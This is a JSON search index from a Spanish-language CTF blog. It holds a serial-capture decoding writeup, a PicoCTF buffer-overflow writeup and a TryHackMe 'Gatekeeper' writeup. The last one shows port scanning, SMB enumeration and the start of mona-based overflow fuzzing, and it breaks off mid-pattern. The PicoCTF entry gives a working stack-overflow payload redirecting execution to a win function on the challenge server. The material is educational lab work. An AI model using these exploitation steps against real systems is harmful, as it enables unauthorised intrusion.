[{"content":"","date":"2023-09-07","id":0,"permalink":"/ctf/intro/","summary":"","tags":[],"title":"Intro"},{"content":"","date":"2024-01-08","id":1,"permalink":"/ctf/hackthebox/","summary":"","tags":[],"title":"HackTheBox"},{"content":"","date":"2024-01-08","id":2,"permalink":"/ctf/picoctf/","summary":"","tags":[],"title":"PicoCTF"},{"content":"","date":"2024-01-08","id":3,"permalink":"/ctf/caixabankk/","summary":"","tags":[],"title":"CaixaBank Tech"},{"content":"","date":"2023-09-07","id":4,"permalink":"/blog/","summary":"","tags":[],"title":"Blog"},{"content":"","date":"2023-09-07","id":5,"permalink":"/writeups/intro/","summary":"","tags":[],"title":"Intro"},{"content":" We accessed the embedded device\u0026rsquo;s asynchronous serial debugging interface while it was operational and captured some messages that were being transmitted over it. Can you decode them?\nAccedimos a la interfaz de depuración serie asíncrona del dispositivo embebido mientras estaba en funcionamiento y capturamos algunos mensajes que se estaban transmitiendo. ¿Puedes decodificarlos?\nArchivos proporcionados: debugging_interface_signal.sal\nPara abrir el .sal usaremos saleae.\nEn mi caso desde arch lo instalé con yay\nyay -S saleae-logic Una vez instalado, lo abrimos e importamos el archivo proporcionado por hackthebox.\nPara encontrar el byterate vamos al principio de la conexión\nVemos que sale 32.02 µs que són 32.02 milisegundos.\nEl Async Serial analyzer nos pide el byterate en segundos así que hacemos una simple operación\n$ python3 -c \u0026#34;print(round(1000000 / 32.02))\u0026#34; 31230 Y ya podemos ver la flag\n","date":"2024-07-16","id":6,"permalink":"/ctf/hackthebox/hardware/debugging-interface/","summary":"We accessed the embedded device\u0026rsquo;s asynchronous serial debugging interface while it was operational and captured some messages that were being transmitted over it.","tags":[],"title":"Debugging Interface"},{"content":"Material / Información Dominio: saturn.picoctf.net Puerto: 63667 (Puede variar) Binario (vuln) Script en c del binario (vuln.c) #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026#34;asm.h\u0026#34; #define BUFSIZE 32 #define FLAGSIZE 64 void win() { char buf[FLAGSIZE]; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,FLAGSIZE,f); printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); printf(\u0026#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n\u0026#34;, get_return_address()); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\u0026#34;Please enter your string: \u0026#34;); vuln(); return 0; } Empezamos\u0026hellip;\nPrimero ejecutamos el script desde gdb-peda y le mandamos muchas \u0026ldquo;A\u0026rdquo;\npython2 -c \u0026#39;print \u0026#34;A\u0026#34; * 100\u0026#39; | ./vuln Please enter your string: Okay, time to return... Fingers Crossed... Jumping to 0x41414141 zsh: done python2 -c \u0026#39;print \u0026#34;A\u0026#34; * 100\u0026#39; | zsh: segmentation fault ./vuln Nos devuelve el error segmentation fault, eso es porque hemos puesto un input más grande que el esperado y hemos sobreescrito registros de la memoria. Esto pasa porque en la función vuln se usa la función gets() la cual no hace ninguna verificación del tamaño de la entrada, lo que da paso a un desbordamiento del buffer\nEl script mostró el siguiente mensaje Jumping to 0x41414141, Si es verdad el mensaje significa que estamos saltando a la dirección 0x41414141, así que hemos conseguido sobreescribir el EIP a 0x41414141 que \u0026ldquo;41\u0026rdquo; significa \u0026ldquo;A\u0026rdquo;\nPero no nos podemos fiar de ese mensaje así que vamos a ejecutar el script con gdb-peda para comprobar el valor del EIP\n\u0026gt; gdb ./vuln gdb-peda$ r Please enter your string: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Okay, time to return... Fingers Crossed... Jumping to 0x41414141 Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x41 (\u0026#39;A\u0026#39;) EBX: 0x41414141 (\u0026#39;AAAA\u0026#39;) ECX: 0xffffcf2c --\u0026gt; 0xf2f7c200 EDX: 0x1 ESI: 0x8049350 (\u0026lt;__libc_csu_init\u0026gt;:\tendbr32) EDI: 0xf7ffcba0 --\u0026gt; 0x0 EBP: 0x41414141 (\u0026#39;AAAA\u0026#39;) ESP: 0xffffcfb0 (\u0026#39;A\u0026#39; \u0026lt;repeats 52 times\u0026gt;) EIP: 0x41414141 (\u0026#39;AAAA\u0026#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41414141 [------------------------------------stack-------------------------------------] 0000| 0xffffcfb0 (\u0026#39;A\u0026#39; \u0026lt;repeats 52 times\u0026gt;) 0004| 0xffffcfb4 (\u0026#39;A\u0026#39; \u0026lt;repeats 48 times\u0026gt;) 0008| 0xffffcfb8 (\u0026#39;A\u0026#39; \u0026lt;repeats 44 times\u0026gt;) 0012| 0xffffcfbc (\u0026#39;A\u0026#39; \u0026lt;repeats 40 times\u0026gt;) 0016| 0xffffcfc0 (\u0026#39;A\u0026#39; \u0026lt;repeats 36 times\u0026gt;) 0020| 0xffffcfc4 (\u0026#39;A\u0026#39; \u0026lt;repeats 32 times\u0026gt;) 0024| 0xffffcfc8 (\u0026#39;A\u0026#39; \u0026lt;repeats 28 times\u0026gt;) 0028| 0xffffcfcc (\u0026#39;A\u0026#39; \u0026lt;repeats 24 times\u0026gt;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41414141 in ?? () gdb-peda$ Ahora ya sí que podemos confirmar que tenemos la capacidad de sobreescribir el EIP.\nEl siguiente paso será calcular cuantas \u0026ldquo;A\u0026rdquo; tenemos que poner hasta llegar al EIP, esto lo podríamos hacer manual, o usar la siguiente función de gdb\ngdb-peda$ pattern_create 100 \u0026#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\u0026#39; Esto nos crea una cadena de caracteres especialmente diseñada para esto. Una vez creada la mandamos al programa\nPor último para terminar de calcularlo le pasaremos el valor del EIP para que gdb-peda calcule el offset.\ngdb-peda$ pattern offset $eip 1094796865 found at offset: 44 Ya tenemos el offset 44.\nVamos a analizar un poco el programa para entenderlo.\nEn la funcion vuln\nvoid vuln(){ char buf[BUFSIZE]; gets(buf); printf(\u0026#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n\u0026#34;, get_return_address()); } Se llama a otra función llamada get_return_address, esta función no se define en ninguna parte de este código así que vamos a abrir el binario con ghydra para investigar esta función.\nundefined4 get_return_address(void) { int unaff_EBP; return *(undefined4 *)(unaff_EBP + 4); } Parece que esta devolviendo el valor del EBP + 4 posiciones, Pero que hay 4 posiciones más arriba del EBP?\nPara saberlo vamos a calcular la cantidad de \u0026ldquo;A\u0026rdquo; que necesitamos para sobreescribir el EBP, igual que hemos hecho con el EIP\ngdb-peda$ pattern offset $ebp found at offset: 40 Si para llegar al EBP necesitamos 40 \u0026ldquo;A\u0026rdquo; i para el EIP necesitamos 44 \u0026ldquo;A\u0026rdquo; lo que hay 4 bytes más arriba del EBP es el EIP. Para verlo desde gdb podemos hacer lo siguiente.\nCreamos un payload con 40 \u0026ldquo;A\u0026rdquo;, 4 \u0026ldquo;B\u0026rdquo; y 4 \u0026ldquo;C\u0026rdquo;\npython3 -c \u0026#39;print(\u0026#34;A\u0026#34; * 40 + \u0026#34;B\u0026#34; * 4 + \u0026#34;C\u0026#34; * 4)\u0026#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC Al mandarlo desde gdb podemos comprobar la conclusión sacada anteriormente\nEBP: 0x42424242 (\u0026#39;BBBB\u0026#39;) ESP: 0xffffcfb0 --\u0026gt; 0xf7c21600 --\u0026gt; 0xbad06 EIP: 0x43434343 (\u0026#39;CCCC\u0026#39;) Ahora ya sabemos bien que hace la función vuln, ahora vamos a ir con la win.\nFunción win\nvoid win() { char buf[FLAGSIZE]; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,FLAGSIZE,f); printf(buf); } Podemos intuir que por esta función estará la flag, ya que está abriendo un archivo en modo lectura llamado flag.txt\u0026hellip;\nEs curioso porque la función win no se llama en ningún punto del script, de hecho desde la función main solo se llama a la funcion vuln() y en ninguna parte de la función vuln() hemos visto que se llame a la función win()\nint main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\u0026#34;Please enter your string: \u0026#34;); vuln(); return 0; } Pero aquí viene la magia, aunque no se llame a la función vuln, la podemos llamar nosotros, ya que tenemos el control sobre el EIP y podemos redirigir el flujo del programa hacia la función win\nPrimero vamos a buscar desde gdb-peda la dirección de la función win\ngdb-peda$ disassemble win Dump of assembler code for function win: 0x080491f6 \u0026lt;+0\u0026gt;:\tendbr32 0x080491fa \u0026lt;+4\u0026gt;:\tpush ebp 0x080491fb \u0026lt;+5\u0026gt;:\tmov ebp,esp 0x080491fd \u0026lt;+7\u0026gt;:\tpush ebx 0x080491fe \u0026lt;+8\u0026gt;:\tsub esp,0x54 0x08049201 \u0026lt;+11\u0026gt;:\tcall 0x8049130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x08049206 \u0026lt;+16\u0026gt;:\tadd ebx,0x2dfa 0x0804920c \u0026lt;+22\u0026gt;:\tsub esp,0x8 0x0804920f \u0026lt;+25\u0026gt;:\tlea eax,[ebx-0x1ff8] 0x08049215 \u0026lt;+31\u0026gt;:\tpush eax 0x08049216 \u0026lt;+32\u0026gt;:\tlea eax,[ebx-0x1ff6] 0x0804921c \u0026lt;+38\u0026gt;:\tpush eax 0x0804921d \u0026lt;+39\u0026gt;:\tcall 0x80490c0 \u0026lt;fopen@plt\u0026gt; 0x08049222 \u0026lt;+44\u0026gt;:\tadd esp,0x10 0x08049225 \u0026lt;+47\u0026gt;:\tmov DWORD PTR [ebp-0xc],eax 0x08049228 \u0026lt;+50\u0026gt;:\tcmp DWORD PTR [ebp-0xc],0x0 0x0804922c \u0026lt;+54\u0026gt;:\tjne 0x8049258 \u0026lt;win+98\u0026gt; 0x0804922e \u0026lt;+56\u0026gt;:\tsub esp,0x4 0x08049231 \u0026lt;+59\u0026gt;:\tlea eax,[ebx-0x1fed] 0x08049237 \u0026lt;+65\u0026gt;:\tpush eax 0x08049238 \u0026lt;+66\u0026gt;:\tlea eax,[ebx-0x1fd8] 0x0804923e \u0026lt;+72\u0026gt;:\tpush eax 0x0804923f \u0026lt;+73\u0026gt;:\tlea eax,[ebx-0x1fa3] 0x08049245 \u0026lt;+79\u0026gt;:\tpush eax 0x08049246 \u0026lt;+80\u0026gt;:\tcall 0x8049040 \u0026lt;printf@plt\u0026gt; 0x0804924b \u0026lt;+85\u0026gt;:\tadd esp,0x10 0x0804924e \u0026lt;+88\u0026gt;:\tsub esp,0xc 0x08049251 \u0026lt;+91\u0026gt;:\tpush 0x0 0x08049253 \u0026lt;+93\u0026gt;:\tcall 0x8049090 \u0026lt;exit@plt\u0026gt; 0x08049258 \u0026lt;+98\u0026gt;:\tsub esp,0x4 0x0804925b \u0026lt;+101\u0026gt;:\tpush DWORD PTR [ebp-0xc] 0x0804925e \u0026lt;+104\u0026gt;:\tpush 0x40 0x08049260 \u0026lt;+106\u0026gt;:\tlea eax,[ebp-0x4c] 0x08049263 \u0026lt;+109\u0026gt;:\tpush eax 0x08049264 \u0026lt;+110\u0026gt;:\tcall 0x8049060 \u0026lt;fgets@plt\u0026gt; 0x08049269 \u0026lt;+115\u0026gt;:\tadd esp,0x10 0x0804926c \u0026lt;+118\u0026gt;:\tsub esp,0xc 0x0804926f \u0026lt;+121\u0026gt;:\tlea eax,[ebp-0x4c] 0x08049272 \u0026lt;+124\u0026gt;:\tpush eax 0x08049273 \u0026lt;+125\u0026gt;:\tcall 0x8049040 \u0026lt;printf@plt\u0026gt; 0x08049278 \u0026lt;+130\u0026gt;:\tadd esp,0x10 0x0804927b \u0026lt;+133\u0026gt;:\tnop 0x0804927c \u0026lt;+134\u0026gt;:\tmov ebx,DWORD PTR [ebp-0x4] 0x0804927f \u0026lt;+137\u0026gt;:\tleave 0x08049280 \u0026lt;+138\u0026gt;:\tret End of assembler dump. Vamos a hacer que el EIP apunte a 0x080491f6 para poder llamar a la función win.\npython2 -c \u0026#34;from struct import pack; eip = pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080491f6); print b\u0026#39;A\u0026#39; * 44 + eip\u0026#34; | ./vuln Please enter your string: Okay, time to return... Fingers Crossed... Jumping to 0x80491f6 Please create \u0026#39;flag.txt\u0026#39; in this directory with your own debugging flag. Hemos podido redirigir el programa hacia la función win!!!! Pero claro, nosotros no tenemos la flag, así que vamos a ejecutarlo desde el dominio y puerto que nos han proporcionado al inicio\npython2 -c \u0026#34;from struct import pack; eip = pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080491f6); print b\u0026#39;A\u0026#39; * 44 + eip\u0026#34; | nc saturn.picoctf.net 56276 Please enter your string: Okay, time to return... Fingers Crossed... Jumping to 0x80491f6 picoCTF{addr3ss3s_ar3_3asy...} ","date":"2024-02-10","id":7,"permalink":"/ctf/picoctf/binaryexplotation-copy/bof1/","summary":"Material / Información Dominio: saturn.picoctf.net Puerto: 63667 (Puede variar) Binario (vuln) Script en c del binario (vuln.c) #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.","tags":["CTF","BoF","Binary Explotation"],"title":"Buffer Overflow 1"},{"content":"","date":"2023-09-07","id":8,"permalink":"/writeups/hackthebox/","summary":"","tags":[],"title":"HackTheBox"},{"content":"Bienvenido a la sección de CTF, aquí vas a encontrar resoluciones de CTF, de plataformas como PicoCTF\nEstadísticas CTF 1\n1\n0\nTipos Web\n0\nForense\n0\n","date":"2023-10-29","id":9,"permalink":"/ctf/intro/bienvenido/","summary":"Bienvenido a la sección de CTF, aquí vas a encontrar resoluciones de CTF, de plataformas como PicoCTF\nEstadísticas CTF 1","tags":[],"title":"Bienvenido"},{"content":"Bienvenido a la sección de writeups, aquí vas a encontrar resoluciones de máquinas, tanto escritas como en formato video, de plataformas como HackTheBox, TryHackMe y HackMyVM.\nEstadísticas writeups 14\n24\n12\n1\n0\n6\n44\n1\n0\nEasy\n38\nMedium\n10\nHard\n2\nInsane\n0\nTotal: 51 ","date":"2023-10-29","id":10,"permalink":"/writeups/intro/bienvenido/","summary":"Bienvenido a la sección de writeups, aquí vas a encontrar resoluciones de máquinas, tanto escritas como en formato video, de plataformas como HackTheBox, TryHackMe y HackMyVM.","tags":[],"title":"Bienvenido"},{"content":"a\n","date":"2023-09-07","id":11,"permalink":"/writeups/tryhackme/","summary":"a","tags":[],"title":"TryHackMe"},{"content":"","date":"2023-09-07","id":12,"permalink":"/writeups/hackmyvm/","summary":"","tags":[],"title":"HackMyVm"},{"content":"","date":"2023-09-07","id":13,"permalink":"/writeups/","summary":"","tags":[],"title":"Writeups"},{"content":"","date":"2023-09-07","id":14,"permalink":"/writeups/vulnhub/","summary":"","tags":[],"title":"VulnHub"},{"content":"","date":"2023-09-07","id":15,"permalink":"/writeups/dockerlabs/","summary":"","tags":[],"title":"Dockerlabs"},{"content":"","date":"2024-06-24","id":16,"permalink":"/contributors/","summary":"","tags":[],"title":"Contributors"},{"content":"","date":"2024-06-24","id":17,"permalink":"/contributors/d3b0o/","summary":"","tags":[],"title":"d3b0o"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n$ ping -c 1 10.10.30.181 PING 10.10.30.181 (10.10.30.181) 56(84) bytes of data. 64 bytes from 10.10.30.181: icmp_seq=1 ttl=127 time=266 ms --- 10.10.30.181 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 266.290/266.290/266.290/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.53.55 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.53.55 5 │ [*] Open ports: 135,139,445,3389,31337,49152,49153,49154,49155 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n$ nmap -p135,139,445,3389,31337,49152,49153,49154,49155,49161,49165 -sCV 10.10.30.181 -oN versions PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2024-06-26T12:00:08+00:00; -1s from scanner time. | rdp-ntlm-info: | Target_Name: GATEKEEPER | NetBIOS_Domain_Name: GATEKEEPER | NetBIOS_Computer_Name: GATEKEEPER | DNS_Domain_Name: gatekeeper | DNS_Computer_Name: gatekeeper | Product_Version: 6.1.7601 |_ System_Time: 2024-06-26T12:00:03+00:00 | ssl-cert: Subject: commonName=gatekeeper | Not valid before: 2024-06-25T11:45:14 |_Not valid after: 2024-12-25T11:45:14 31337/tcp open Elite? | fingerprint-strings: | FourOhFourRequest: | Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0 | Hello | GenericLines: | Hello | Hello | GetRequest: | Hello GET / HTTP/1.0 | Hello | HTTPOptions: | Hello OPTIONS / HTTP/1.0 | Hello | Help: | Hello HELP | Kerberos: | Hello !!! | LDAPSearchReq: | Hello 0 | Hello | LPDString: | Hello | default!!! | RTSPRequest: | Hello OPTIONS / RTSP/1.0 | Hello | SIPOptions: | Hello OPTIONS sip:nm SIP/2.0 | Hello Via: SIP/2.0/TCP nm;branch=foo | Hello From: \u0026lt;sip:nm@nm\u0026gt;;tag=root | Hello To: \u0026lt;sip:nm2@nm2\u0026gt; | Hello Call-ID: 50000 | Hello CSeq: 42 OPTIONS | Hello Max-Forwards: 70 | Hello Content-Length: 0 | Hello Contact: \u0026lt;sip:nm@nm\u0026gt; | Hello Accept: application/sdp | Hello | SSLSessionReq, TLSSessionReq, TerminalServerCookie: |_ Hello 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC SMB Empezamos enumerando el SMB\nsmbclient -L 10.10.30.181 Password for [WORKGROUP\\d3bo]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Users Disk Hay un recurso compartido llamado Users al cual tenemos permisos para acceder\n$ smbclient //10.10.30.181/Users Password for [WORKGROUP\\d3bo]: smb: \\\u0026gt; ls Default DHR 0 Tue Jul 14 09:07:31 2009 desktop.ini AHS 174 Tue Jul 14 06:54:24 2009 Share D 0 Fri May 15 03:58:07 2020 smb: \\\u0026gt; cd Share smb: \\Share\\\u0026gt; ls gatekeeper.exe A 13312 Mon Apr 20 07:27:17 2020 Dentro de la carpeta Share hay un archivo llamado gatkeeper.exe, nos lo vamos a descargar y abrir en una máquina windows, para ver que hace.\nEl programa ha abierto el puerto 31337 de mi windows. Casualmente, parece que el servicio que se me ha abierto con el gatekeeper.exe es el mismo que corre por la máquina víctima.\n$ nc 192.168.1.142 31337 Testing Hello Testing!!! $ nc 10.10.30.181 31337 Testing Hello Testing!!! Si le mando un input muy grande, el programa peta, vamos a ver desde immunity debugger que es lo que está pasando.\nBoF Empezamos mandando 1000 \u0026lsquo;A\u0026rsquo;\npython3 -c \u0026#39;print(\u0026#34;A\u0026#34; * 1000)\u0026#39; | nc 192.168.1.142 31337 Desde immunity debugger vemos que el programa ha petado, el mensaje de error dice que el programa no sabe por donde continuar porque la dirección 41414141 no existe. Esto se debe a que hemos puesto un input tan grande que hemos sobreescrito registros de la memoria, tales como el EIP, que es el encargado de guardar la próxima dirección por donde va a ir el programa. Al nosotros haber sobreescrito el EIP con 41414141 (AAAA), el programa peta. Sabiendo esto, vamos a intentar explotar un Buffer Overflow\nEmpezamos asignando a mona nuestra carpeta de trabajo\n!mona config -set workingfolder C:\\Users\\arnau\\Downloads\\bof Seguimos creando una string de 5000 caracteres la cual nos servirá para encontrar el offset para llegar al EIP\n!mona pattern_create 5000 Mona nos crea el archivo pattern en la carpeta que especificamos anteriormente\nAhora mandamos toda la string de nuevo.\nnc 192.168.1.142 31337 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1D